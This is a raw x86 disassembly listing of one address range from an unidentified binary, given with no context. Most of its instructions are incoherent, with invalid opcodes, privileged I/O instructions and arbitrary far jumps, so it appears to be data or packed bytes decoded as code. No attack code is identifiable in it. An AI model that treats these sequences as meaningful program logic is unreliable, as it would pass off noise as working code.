  41e7d4:	hlt    
  41e7d5:	sub    al,0xbf
  41e7d7:	cmp    al,0x9a
  41e7d9:	mov    al,ds:0x7ee10c71
  41e7de:	mov    edi,0xc10b0724
  41e7e3:	js     0x41e7dc
  41e7e5:	push   0x94031646
  41e7ea:	into   
  41e7eb:	dec    eax
  41e7ec:	imul   ebp,DWORD PTR [edi-0x36],0xfce40aed
  41e7f3:	add    BYTE PTR [eiz*4-0x380f5037],dl
  41e7fa:	cmp    eax,0x1f9fa6fc
  41e7ff:	clc    
  41e800:	push   cs
  41e801:	inc    esi
  41e802:	push   esp
  41e803:	(bad)  
  41e804:	stos   DWORD PTR es:[edi],eax
  41e805:	or     eax,0xa4125268
  41e80a:	clc    
  41e80b:	and    BYTE PTR ds:0x40a178,bh
	...
  41e871:	add    BYTE PTR [eax],al
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e87c
  41e881:	xchg   edi,eax
  41e882:	fwait
  41e883:	xchg   DWORD PTR [eax+0x4000144],esp
  41e889:	add    DWORD PTR [eax],eax
  41e88b:	add    BYTE PTR [ecx+ecx*8],al
  41e88e:	mov    ebp,0x20fffca2
  41e893:	sti    
  41e894:	(bad)  
  41e895:	jo     0x41e8d0
  41e897:	jle    0x41e90c
  41e899:	cmp    DWORD PTR [esi-0x1e],0x21
  41e89d:	sbb    esp,ebx
  41e89f:	sbb    esp,DWORD PTR [ebp+0x7d4f58fe]
  41e8a5:	push   esi
  41e8a6:	hlt    
  41e8a7:	inc    esp
  41e8a8:	mov    ds:0x9b436e4c,al
  41e8ad:	inc    edx
  41e8ae:	imul   ebx,DWORD PTR [eax-0x62f4e13d],0x79ba4453
  41e8b8:	pop    esp
  41e8b9:	push   ds
  41e8ba:	sub    al,0x55
  41e8bc:	ss dec ebx
  41e8be:	pop    ebp
  41e8bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8c0:	add    al,0x2b
  41e8c2:	cmp    al,0xf8
  41e8c4:	shl    BYTE PTR [ecx],1
  41e8c6:	mov    eax,ds:0xccebae97
  41e8cb:	call   DWORD PTR [ecx-0xce4fbf8]
  41e8d1:	loope  0x41e93a
  41e8d3:	test   BYTE PTR [esi+0x6e],dl
  41e8d6:	xor    edi,DWORD PTR [esi]
  41e8d8:	cmp    DWORD PTR [ebx+0x30],ebp
  41e8db:	mov    eax,0x55acb41c
  41e8e0:	xor    bl,BYTE PTR [edi+0xf94e3d9]
  41e8e6:	jg     0x41e899
  41e8e8:	outs   dx,DWORD PTR fs:[esi]
  41e8ea:	cmp    DWORD PTR [edx+ecx*1-0x50],edi
  41e8ee:	xchg   ecx,eax
  41e8ef:	popa   
  41e8f0:	push   es
  41e8f1:	xlat   BYTE PTR ds:[ebx]
  41e8f2:	bound  eax,QWORD PTR [eax-0x73]
  41e8f5:	add    BYTE PTR [eax-0x11],ah
  41e8f8:	xor    DWORD PTR [esi+0x176830b6],edx
  41e8fe:	pop    ss
  41e8ff:	sar    esi,1
  41e901:	sahf   
  41e902:	cmp    eax,esi
  41e904:	ret    
  41e905:	popf   
  41e906:	inc    ebx
  41e907:	sub    DWORD PTR [edx],esp
  41e909:	jne    0x41e8fd
  41e90b:	jmp    0xfc371905
  41e910:	jne    0x41e968
  41e912:	retf   0x8298
  41e915:	in     al,dx
  41e916:	or     eax,0xa8419335
  41e91b:	push   0xf6c805c0
  41e920:	and    BYTE PTR [esi-0x76470d52],al
  41e926:	dec    edi
  41e927:	call   0x2ee2818c
  41e92c:	das    
  41e92d:	mov    BYTE PTR [ecx-0x13c8168f],cl
  41e933:	gs shl dh,cl
  41e936:	in     eax,dx
  41e937:	hlt    
  41e938:	and    ah,BYTE PTR [esi+0x3e]
  41e93b:	retf   
  41e93c:	in     al,0xd4
  41e93e:	add    eax,0xf1805a29
  41e943:	add    BYTE PTR [edi+0xb],al
  41e946:	push   ss
  41e947:	rep ins DWORD PTR es:[edi],dx
  41e949:	mov    eax,0x5ae9c58a
  41e94e:	inc    ecx
  41e94f:	jnp    0x41e907
  41e951:	mov    esi,DWORD PTR [eax-0x20]
  41e954:	pushf  
  41e955:	iret   
  41e956:	lea    ebx,[ebx+0x70]
  41e959:	leave  
  41e95a:	xlat   BYTE PTR ds:[ebx]
  41e95b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e95c:	xor    bl,dh
  41e95e:	cmp    al,0x9c
  41e960:	cli    
  41e961:	nop    DWORD PTR gs:[esi]
  41e965:	push   ds
  41e966:	sar    bl,1
  41e968:	(bad)  
  41e96a:	mov    ebx,0xb9665d7f
  41e96f:	pusha  
  41e970:	in     eax,0x4a
  41e972:	fcmove st,st(2)
  41e974:	sub    eax,0x47eb4305
  41e979:	popf   
  41e97a:	mov    ch,0x75
  41e97c:	inc    ebp
  41e97d:	call   0x7602:0x68f85ae1
  41e984:	popf   
  41e985:	lahf   
  41e986:	pop    esi
  41e987:	xchg   ecx,eax
  41e988:	cmc    
  41e989:	sbb    al,BYTE PTR [edi-0x44]
  41e98c:	out    dx,eax
  41e98d:	add    ebx,edx
  41e98f:	je     0x41e991
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	lods   al,BYTE PTR ds:[esi]
  41ea01:	jnp    0x41ea44
  41ea03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea05:	inc    ebp
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	mov    esp,0x75316ac6
  41ea11:	clc    
  41ea12:	mov    bl,BYTE PTR [edx-0xc]
  41ea15:	jns    0x41e9f2
  41ea17:	push   edx
  41ea18:	add    al,0x21
  41ea1a:	mov    cl,0xf5
  41ea1c:	xchg   edi,eax
  41ea1d:	xchg   esp,eax
  41ea1e:	push   ds
  41ea1f:	fst    DWORD PTR [edx-0x5b]
  41ea22:	call   0xdeca:0x8681275d
  41ea29:	jge    0x41ea68
  41ea2b:	call   0x868042a4
  41ea30:	push   0xc8deb76b
  41ea35:	jo     0x41ea9b
  41ea37:	lock adc al,0x4d
  41ea3a:	dec    edx
  41ea3b:	test   DWORD PTR [esi+0x4ee144ab],edi
  41ea41:	pop    edx
  41ea42:	mov    ah,0x4d
  41ea44:	out    0xe6,al
  41ea46:	dec    esi
  41ea47:	adc    ecx,DWORD PTR [edx+0x6cc76a01]
  41ea4d:	inc    edx
  41ea4e:	xchg   DWORD PTR [edx-0x561ee15c],esi
  41ea54:	test   al,0x4c
  41ea56:	jnp    0x41ea81
  41ea58:	fld    DWORD PTR [eax+ecx*4+0x76]
  41ea5c:	mov    dl,0xf1
  41ea5e:	cdq    
  41ea5f:	dec    eax
  41ea60:	ja     0x41ea60
  41ea62:	addr16 pop ss
  41ea64:	or     al,BYTE PTR [edx]
  41ea66:	xchg   ebx,eax
  41ea67:	push   cs
  41ea68:	ins    BYTE PTR es:[edi],dx
  41ea69:	inc    ebx
  41ea6a:	push   cs
  41ea6b:	arpl   WORD PTR [eax-0x3ab3d417],ax
  41ea71:	or     edx,DWORD PTR [edi+0x14]
  41ea74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea75:	sub    al,0xfb
  41ea77:	in     al,0x58
  41ea79:	adc    eax,0xa1d4f9b3
  41ea7e:	pop    es
  41ea7f:	mov    bl,0x6c
  41ea81:	retfw  
  41ea83:	or     bh,BYTE PTR [ebx+0x49]
  41ea86:	pop    es
  41ea87:	mov    ds:0x9c7bb3fa,al
  41ea8c:	mov    esp,0x76b8d24f
  41ea91:	loope  0x41eaa5
  41ea93:	dec    ebp
  41ea94:	and    DWORD PTR [eax+eax*2],eax
  41ea97:	retf   
  41ea98:	jae    0x41eb11
  41ea9a:	add    edx,esp
  41ea9c:	arpl   WORD PTR [edx+0x2edb4544],sp
  41eaa2:	cmp    esp,DWORD PTR [edi]
  41eaa4:	and    bl,BYTE PTR [eax]
  41eaa6:	and    esi,DWORD PTR [ebx+0x52]
  41eaa9:	xchg   edi,eax
  41eaaa:	cwde   
  41eaab:	into   
  41eaac:	js     0x41ea4a
  41eaae:	push   cs
  41eaaf:	push   ss
  41eab0:	jmp    0x6a97:0xc8ed4df6
  41eab7:	sbb    DWORD PTR [eax+0x1c307c53],0xfe2131dd
  41eac1:	push   ds
  41eac2:	(bad)  
  41eac3:	(bad)  [ebx+0x5b]
  41eac6:	sub    DWORD PTR [ecx+0x1c],edi
  41eac9:	add    BYTE PTR [ebp-0x19634dd4],ch
  41eacf:	push   eax
  41ead0:	loope  0x41ea98
  41ead2:	mov    al,0x96
  41ead4:	mov    dh,0x37
  41ead6:	mov    eax,0x8960af05
  41eadb:	in     al,dx
  41eadc:	inc    ecx
  41eadd:	sbb    DWORD PTR [edx-0x54],edi
  41eae0:	xchg   ecx,eax
  41eae1:	(bad)  
  41eae2:	repz jae 0x41eaf4
  41eae5:	inc    edi
  41eae6:	in     eax,0x31
  41eae8:	sahf   
  41eae9:	sub    DWORD PTR [eax-0x2e],esp
  41eaec:	and    al,0x13
  41eaee:	push   0xa022303
  41eaf3:	outs   dx,DWORD PTR ds:[esi]
  41eaf4:	test   ch,dl
  41eaf6:	mov    ah,0xd2
  41eaf8:	mov    al,ds:0x503882fe
  41eafd:	sbb    DWORD PTR [ebx],0xea5726bf
  41eb03:	mov    WORD PTR [ebp+0x74],?
  41eb06:	imul   ecx,DWORD PTR [edi-0x3791f22e],0xffffff88
  41eb0d:	xor    ebp,DWORD PTR [esi+0x4c]
	...
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0xb7
  41eb81:	enter  0xc227,0xa8
  41eb85:	inc    esi
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    al,0x1
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	into   
  41eb8d:	push   0x50c0f83f
  41eb92:	inc    ecx
  41eb93:	ja     0x41ebfa
  41eb95:	jmp    0x4c9b:0xfc4feb1b
  41eb9c:	pop    ecx
  41eb9d:	mov    esp,0xafa067c8
  41eba2:	mov    bh,BYTE PTR [edi+0x38]
  41eba5:	or     esp,DWORD PTR [esi+eiz*1]
  41eba8:	daa    
  41eba9:	mul    cl
  41ebab:	aas    
  41ebac:	rol    DWORD PTR [esi+0x5f],1
  41ebaf:	daa    
  41ebb0:	and    DWORD PTR [ebx+ebp*2+0x7c80fa16],edi
  41ebb7:	push   0xffffffc2
  41ebb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebba:	xchg   ecx,eax
  41ebbb:	aam    0xd3
  41ebbd:	sub    ecx,DWORD PTR [edx]
  41ebbf:	repnz shl BYTE PTR [esi],0x8e
  41ebc3:	and    al,0xc7
  41ebc5:	sub    DWORD PTR [edx-0x6a95a7bf],edi
  41ebcb:	pop    ecx
  41ebcc:	ret    
  41ebcd:	cs inc edi
  41ebcf:	or     ebx,DWORD PTR [esi-0x22]
  41ebd2:	imul   eax,esp,0xffffffab
  41ebd5:	dec    edi
  41ebd6:	mov    cl,0xc7
  41ebd8:	mov    edi,0xd0e4a95d
  41ebdd:	les    edi,FWORD PTR [ebp+ebp*1+0x6b]
  41ebe1:	adc    DWORD PTR [edi+eiz*2+0x3d],ecx
  41ebe5:	scas   al,BYTE PTR es:[edi]
  41ebe6:	pop    ecx
  41ebe7:	xchg   esi,eax
  41ebe8:	dec    eax
  41ebe9:	inc    ecx
  41ebea:	push   ebp
  41ebeb:	pusha  
  41ebec:	dec    edx
  41ebed:	jnp    0x41ebe0
  41ebef:	push   esi
  41ebf0:	dec    ebp
  41ebf1:	pop    edx
  41ebf2:	push   ecx
  41ebf3:	mov    edi,0x7d92ef6c
  41ebf8:	pop    ds
  41ebf9:	(bad)  gs:[esi-0x42]
  41ebfd:	(bad)  
  41ebfe:	mov    cl,0x60
  41ec00:	or     BYTE PTR [edx],bh
  41ec02:	mov    DWORD PTR [ecx],eax
  41ec04:	cmp    ah,BYTE PTR [ecx+0x218495de]
  41ec0a:	sti    
  41ec0b:	mov    bl,0x0
  41ec0d:	sbb    eax,0x7b682787
  41ec12:	nop
  41ec13:	add    ebx,ebp
  41ec15:	in     al,dx
  41ec16:	and    esp,DWORD PTR [ebx]
  41ec18:	push   ds
  41ec19:	sbb    DWORD PTR [esi-0x2a],edx
  41ec1c:	imul   esi,edx,0x734acbce
  41ec22:	mov    ecx,0x26cc2513
  41ec27:	fcom   QWORD PTR [eax+0x75954617]
  41ec2d:	push   eax
  41ec2e:	imul   eax,ecx,0xffffffbb
  41ec31:	pop    esp
  41ec32:	retf   0x6624
  41ec35:	mov    cl,0x50
  41ec37:	shl    BYTE PTR [eax+edi*8],1
  41ec3a:	sub    DWORD PTR [ebx+0x38e0c8fa],edi
  41ec40:	into   
  41ec41:	enter  0x3efd,0x83
  41ec45:	fidiv  WORD PTR [edi+0x1f7b4c5e]
  41ec4b:	pop    es
  41ec4c:	shl    BYTE PTR [ebx-0x7588a965],1
  41ec52:	jecxz  0x41ec7c
  41ec54:	add    DWORD PTR ds:0x62794674,esp
  41ec5a:	inc    esi
  41ec5b:	push   esi
  41ec5c:	repnz bnd jne 0x41ecd0
  41ec60:	(bad)  
  41ec61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec62:	dec    cx
  41ec64:	ja     0x41ece2
  41ec66:	inc    ecx
  41ec67:	cld    
  41ec68:	out    0xff,al
  41ec6a:	shl    DWORD PTR [edx],1
  41ec6c:	imul   ecx,DWORD PTR [ecx+edi*4],0x8672634c
  41ec73:	push   0xffffffff
  41ec75:	test   BYTE PTR [ecx],bl
  41ec77:	test   esi,ebp
  41ec79:	xchg   edi,eax
  41ec7a:	inc    ecx
  41ec7b:	mov    cl,0xa7
  41ec7d:	fmul   QWORD PTR [eax-0x6002ca28]
  41ec83:	out    dx,al
  41ec84:	ins    DWORD PTR es:[edi],dx
  41ec85:	mov    WORD PTR [esp+ebp*1-0x7c],?
  41ec89:	inc    esp
  41ec8a:	ror    DWORD PTR [ecx+ecx*4+0x8e074b],0x0
	...
  41ecf2:	add    BYTE PTR [eax],al
  41ecf4:	inc    ecx
  41ecf5:	icebp  
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xac675fd0
  41ed02:	lea    esp,[esi+0x147ac]
  41ed08:	add    al,0x1
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	mov    bl,0x56
  41ed0e:	jecxz  0x41ed4d
  41ed10:	adc    al,0x69
  41ed12:	jns    0x41ecd7
  41ed14:	xchg   esi,eax
  41ed15:	mov    al,ds:0xe7d5a69c
  41ed1a:	leave  
  41ed1b:	fist   DWORD PTR [edx-0x2f]
  41ed1e:	ret    
  41ed1f:	fs inc ecx
  41ed21:	lea    ebp,[ebp-0x5e30fc07]
  41ed27:	mov    ch,0xdb
  41ed29:	xchg   ebp,eax
  41ed2a:	xor    bh,cl
  41ed2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed2d:	mov    DWORD PTR ds:0x69a0ca8d,esi
  41ed33:	repz mov esp,0x390dfbb3
  41ed39:	xchg   ebp,eax
  41ed3a:	popf   
  41ed3b:	mov    dh,0x6f
  41ed3d:	mov    al,ds:0x1528a071
  41ed42:	ja     0x41ed59
  41ed44:	(bad)  
  41ed45:	cmp    DWORD PTR [ebp-0x4b2c93ab],esp
  41ed4b:	and    ecx,DWORD PTR [ebx]
  41ed4d:	dec    esp
  41ed4e:	push   ebx
  41ed4f:	pop    edi
  41ed50:	xchg   edi,eax
  41ed51:	jle    0x41ed69
  41ed53:	and    BYTE PTR [eax],0x98
  41ed56:	fs rcl ebx,0x4b
  41ed5a:	cmp    esp,DWORD PTR [eax+0x79460e2f]
  41ed60:	enter  0x94b,0x2d
  41ed64:	popf   
  41ed65:	cmp    cl,BYTE PTR [eax]
  41ed67:	enter  0x32fe,0x90
  41ed6b:	sbb    al,0x82
  41ed6d:	jg     0x41ed4e
  41ed6f:	or     edx,eax
  41ed71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed72:	out    0xfc,eax
  41ed74:	mov    edx,0xf8f522cc
  41ed79:	xchg   edi,eax
  41ed7a:	in     eax,0xf9
  41ed7c:	or     cl,BYTE PTR [esi-0x13]
  41ed7f:	mov    ecx,0x35adbe1f
  41ed84:	popf   
  41ed85:	mov    dl,0x6
  41ed87:	mov    ds:0x2204ea5b,al
  41ed8c:	inc    edi
  41ed8d:	inc    ebx
  41ed8e:	call   0x72bb:0x36902128
  41ed95:	mov    eax,ds:0x5318a875
  41ed9a:	fdiv   st(6),st
  41ed9c:	add    dl,bl
  41ed9e:	iret   
  41ed9f:	stc    
  41eda0:	cli    
  41eda1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eda2:	lods   al,BYTE PTR ds:[esi]
  41eda3:	sbb    DWORD PTR [ecx-0x23ad1eaa],eax
  41eda9:	cmp    bl,BYTE PTR ds:0x6df1501a
  41edaf:	icebp  
  41edb0:	shl    DWORD PTR [edx+ebp*2-0x74718c34],1
  41edb7:	pop    ecx
  41edb8:	pop    edx
  41edb9:	lods   al,BYTE PTR ds:[esi]
  41edba:	sub    dh,cl
  41edbc:	jne    0x41edea
  41edbe:	add    BYTE PTR [eax+0x4b],dh
  41edc1:	or     cl,ch
  41edc3:	retf   
  41edc4:	pop    edx
  41edc5:	pop    esp
  41edc6:	jle    0x41edd8
  41edc8:	hlt    
  41edc9:	(bad)  
  41edca:	(bad)  
  41edcb:	jmp    FWORD PTR [eax]
  41edcd:	fldcw  WORD PTR [esi]
  41edcf:	ja     0x41ede3
  41edd1:	das    
  41edd2:	sbb    DWORD PTR [ecx+ebp*1+0x7e66f809],0x99577c69
  41eddd:	mov    ?,WORD PTR ds:0x88b43d40
  41ede3:	push   0x38
  41ede5:	int3   
  41ede6:	mov    eax,ds:0xc863ce8f
  41edeb:	add    bl,ah
  41eded:	aas    
  41edee:	fsub   st(1),st
  41edf0:	push   ecx
  41edf1:	repz inc esp
  41edf3:	test   BYTE PTR [edx+edx*4-0x5a],bh
  41edf7:	popa   
  41edf8:	dec    edx
  41edf9:	arpl   WORD PTR [ecx-0xf54acc0],ax
  41edff:	leave  
  41ee00:	(bad)  
  41ee01:	loope  0x41ee52
  41ee03:	rcr    DWORD PTR [ebp+0x77],0xac
  41ee07:	push   esp
  41ee08:	inc    eax
  41ee09:	clc    
  41ee0a:	inc    ebp
  41ee0b:	out    dx,eax
  41ee0c:	xor    eax,ebx
  41ee0e:	sbb    bl,BYTE PTR ds:0x0
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb007:0x44ff16e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	ds cs mov edx,0x1fd441c6
  41ee93:	jmp    0xab7ca11d
  41ee98:	test   eax,0x4ce1c14c
  41ee9d:	pmaxsw mm7,QWORD PTR [esi+edx*2-0x26]
  41eea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eea3:	sbb    BYTE PTR [ecx-0x74],dh
  41eea6:	pusha  
  41eea7:	pusha  
  41eea8:	or     DWORD PTR [ecx],edi
  41eeaa:	icebp  
  41eeab:	push   edx
  41eeac:	adc    ebp,DWORD PTR es:[esi+0x79123a74]
  41eeb3:	pushf  
  41eeb4:	out    0xe4,al
  41eeb6:	sub    al,0x67
  41eeb8:	sub    esp,ebx
  41eeba:	jmp    0x41eeee
  41eebc:	and    eax,eax
  41eebe:	gs xchg ebp,eax
  41eec0:	mov    ah,0x78
  41eec2:	sub    esp,edi
  41eec4:	mov    eax,ds:0xb8a583ca
  41eec9:	in     eax,dx
  41eeca:	cmc    
  41eecb:	mov    cl,0x5a
  41eecd:	inc    ecx
  41eece:	push   0xffffffa8
  41eed0:	sar    DWORD PTR [ebx],cl
  41eed2:	dec    edx
  41eed3:	test   DWORD PTR [ebp-0xa],edx
  41eed6:	cmp    ch,ch
  41eed8:	imul   eax,DWORD PTR [ecx+0x38],0xffffffac
  41eedc:	clc    
  41eedd:	push   es
  41eede:	cs pop edx
  41eee0:	inc    edi
  41eee1:	pop    edi
  41eee2:	pop    ds
  41eee3:	dec    esi
  41eee4:	cmp    eax,ecx
  41eee6:	mov    WORD PTR [eax+eiz*8],ss
  41eee9:	in     al,dx
  41eeea:	jno    0x41ef45
  41eeec:	imul   eax,DWORD PTR [ebx-0x1f],0x4d8a1519
  41eef3:	pop    esi
  41eef4:	pop    esp
  41eef5:	outs   dx,BYTE PTR ds:[esi]
  41eef6:	push   ecx
  41eef7:	lea    ebp,[edx-0x7517feda]
  41eefd:	sub    BYTE PTR [eax],0xa8
  41ef00:	lods   eax,DWORD PTR ds:[esi]
  41ef01:	lods   eax,DWORD PTR ds:[esi]
  41ef02:	cmp    esp,ebx
  41ef04:	inc    ecx
  41ef05:	sbb    al,0x86
  41ef07:	in     al,dx
  41ef08:	in     eax,0x3c
  41ef0a:	sub    DWORD PTR [ebx-0x21676a5a],ecx
  41ef10:	ja     0x41eefa
  41ef12:	dec    ebx
  41ef13:	enter  0xfcf7,0xc3
  41ef17:	push   esp
  41ef18:	dec    esp
  41ef19:	(bad)  [ecx-0x59]
  41ef1c:	push   ebp
  41ef1d:	popa   
  41ef1e:	mov    edx,0xcaf86f32
  41ef23:	jns    0x41eeb8
  41ef25:	xchg   ebx,eax
  41ef26:	mov    esi,0xedfa4fd8
  41ef2b:	inc    esi
  41ef2c:	test   al,0xd6
  41ef2e:	test   BYTE PTR [edi+0x1311083e],al
  41ef34:	jns    0x41eed1
  41ef36:	fld    QWORD PTR [ebx]
  41ef38:	loopne 0x41eec7
  41ef3a:	retf   0x8010
  41ef3d:	scas   eax,DWORD PTR es:[edi]
  41ef3e:	cmp    al,0x14
  41ef40:	loopne 0x41eef1
  41ef42:	out    dx,eax
  41ef43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef44:	adc    al,0xc
  41ef46:	jmp    0xcd14:0x14f95e10
  41ef4d:	iret   
  41ef4e:	pusha  
  41ef4f:	sbb    BYTE PTR [eax+0x31e1f8ee],al
  41ef55:	outs   dx,BYTE PTR ds:[esi]
  41ef56:	adc    eax,DWORD PTR [esp+eiz*4-0x4fbfa2da]
  41ef5d:	xchg   ebx,eax
  41ef5e:	mov    BYTE PTR [ecx],dh
  41ef60:	mov    eax,ds:0xa3213da3
  41ef65:	and    BYTE PTR [esi-0x10],0x9a
  41ef69:	aaa    
  41ef6a:	in     eax,0x67
  41ef6c:	shl    ecx,cl
  41ef6e:	jmp    0x89b3f705
  41ef73:	mov    cl,dl
  41ef75:	int3   
  41ef76:	outs   dx,DWORD PTR ds:[esi]
  41ef77:	add    ch,BYTE PTR [edx]
  41ef79:	or     eax,0x68a798c9
  41ef7e:	scas   eax,DWORD PTR es:[edi]
  41ef7f:	pop    ebx
  41ef80:	mov    eax,ds:0xfe70d767
  41ef85:	dec    ecx
  41ef86:	push   es
  41ef87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef88:	push   ebx
  41ef89:	dec    esi
  41ef8a:	mov    WORD PTR [eax-0x72],ss
  41ef8d:	sub    al,0x16
  41ef8f:	(bad)  
	...
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul esp,DWORD PTR [edi-0x10],0x5c
  41f003:	stos   BYTE PTR es:[edi],al
  41f004:	mov    ah,0x49
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	xlat   BYTE PTR ds:[ebx]
  41f00d:	int3   
  41f00e:	add    eax,0x4bcf28e8
  41f013:	sti    
  41f014:	sbb    ebx,ebp
  41f016:	imul   ebp,DWORD PTR [ebx-0x5],0x363515ce
  41f01d:	or     esp,DWORD PTR [ebp-0x78af3538]
  41f023:	hlt    
  41f024:	int    0xdb
  41f026:	and    eax,0x7f4fe882
  41f02b:	cdq    
  41f02c:	sub    ecx,eax
  41f02e:	pop    ebp
  41f02f:	cdq    
  41f030:	and    BYTE PTR [ebp-0x41f3ab80],dh
  41f036:	push   ecx
  41f037:	pushf  
  41f038:	xor    eax,0xed93481d
  41f03d:	test   esp,0xba614840
  41f043:	jecxz  0x41f0c1
  41f045:	(bad)  
  41f046:	aas    
  41f047:	fiadd  WORD PTR [ecx-0x5c]
  41f04a:	mov    ds:0x56295833,eax
  41f04f:	ret    
  41f050:	rcl    DWORD PTR [eax],cl
  41f052:	enter  0xd055,0xd3
  41f056:	mov    ss,ebp
  41f058:	pop    edx
  41f059:	das    
  41f05a:	jbe    0x41f098
  41f05c:	je     0x41f07d
  41f05e:	(bad)
  41f061:	push   esp
  41f062:	push   ds
  41f063:	inc    esp
  41f064:	retf   
  41f065:	int    0x46
  41f067:	es loop 0x41f011
  41f06a:	cmp    esi,edx
  41f06c:	cmp    dh,BYTE PTR [esi+0x33785cd1]
  41f072:	pop    ss
  41f073:	push   ss
  41f074:	nop
  41f075:	ror    ebx,cl
  41f077:	loop   0x41f0cd
  41f079:	mov    al,ds:0xcfbc608a
  41f07e:	std    
  41f07f:	retf   
  41f080:	test   al,bh
  41f082:	mov    ah,0x3a
  41f084:	cmp    BYTE PTR ds:0xab6c25d5,0x47
  41f08b:	pop    ecx
  41f08c:	pop    eax
  41f08d:	loope  0x41f087
  41f08f:	out    0x6b,al
  41f091:	out    0xc3,eax
  41f093:	mov    edi,0x7715b75f
  41f098:	xor    al,0x8
  41f09a:	pop    ebx
  41f09b:	add    DWORD PTR [ebp-0x2e],ebp
  41f09e:	adc    al,BYTE PTR [ecx+0x64915d1b]
  41f0a4:	adc    al,0xae
  41f0a6:	call   FWORD PTR [ecx-0x3b]
  41f0a9:	sub    eax,0x81f24430
  41f0ae:	std    
  41f0af:	mov    ebx,0x620b92bf
  41f0b4:	jg     0x41f0f8
  41f0b6:	sub    al,0xd0
  41f0b8:	test   eax,0x499313ba
  41f0bd:	call   DWORD PTR [edx+esi*8]
  41f0c0:	sti    
  41f0c1:	push   edi
  41f0c2:	in     al,0xee
  41f0c4:	out    dx,al
  41f0c5:	or     DWORD PTR [edi],edx
  41f0c7:	cmp    eax,0xa2b5f642
  41f0cc:	addr16 push ecx
  41f0ce:	loope  0x41f07e
  41f0d0:	or     al,0xf1
  41f0d2:	mov    ecx,0x291fdae0
  41f0d7:	cld    
  41f0d8:	xchg   ebp,eax
  41f0d9:	ss ja  0x41f0b2
  41f0dc:	ret    
  41f0dd:	mov    ds:0xa2c65b2c,eax
  41f0e2:	mov    esi,0x2aaf96a2
  41f0e7:	scas   eax,DWORD PTR es:[edi]
  41f0e8:	in     al,dx
  41f0e9:	loop   0x41f104
  41f0eb:	shl    BYTE PTR [ecx],1
  41f0ed:	loopne 0x41f119
  41f0ef:	jb     0x41f0c3
  41f0f1:	xor    edx,DWORD PTR gs:[ebp+0x7d]
  41f0f5:	mov    edi,0xd3e173e
  41f0fa:	retf   
  41f0fb:	pop    ss
  41f0fc:	fcmovb st,st(2)
  41f0fe:	fwait
  41f0ff:	xchg   BYTE PTR [ebx-0x28421546],ah
  41f105:	shl    ah,1
  41f107:	mov    bh,0x4b
  41f109:	mov    ds:0xf3503e36,al
  41f10e:	std    
  41f10f:	cli    
	...
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0xcf73bd3a
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	retf   0xdf18
  41f18f:	push   eax
  41f190:	sahf   
  41f191:	icebp  
  41f192:	adc    al,0x34
  41f194:	inc    esi
  41f195:	mov    ds:0x93c5d4b1,al
  41f19a:	out    dx,al
  41f19b:	jg     0x41f1f0
  41f19d:	dec    esi
  41f19e:	gs jns 0x41f129
  41f1a1:	jo     0x41f15c
  41f1a3:	mov    es,ecx
  41f1a5:	cmp    bh,dl
  41f1a7:	out    dx,eax
  41f1a8:	inc    ebp
  41f1a9:	mov    ds,ecx
  41f1ab:	inc    esi
  41f1ac:	and    ebp,DWORD PTR [esi+esi*4-0x5b51bf4f]
  41f1b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1b4:	or     ch,BYTE PTR [edx-0x4d9cdc96]
  41f1ba:	daa    
  41f1bb:	sbb    esp,eax
  41f1bd:	mov    WORD PTR [eax],cs
  41f1bf:	loopne 0x41f1ac
  41f1c1:	dec    ecx
  41f1c2:	repnz ins DWORD PTR es:[edi],dx
  41f1c4:	inc    ebx
  41f1c5:	adc    eax,0x84b73e4e
  41f1ca:	jae    0x41f219
  41f1cc:	add    BYTE PTR [edi],ch
  41f1ce:	push   ebx
  41f1cf:	aam    0xb
  41f1d1:	jmp    0x1d65324e
  41f1d6:	call   0x3d0:0x9a975a6
  41f1dd:	push   esp
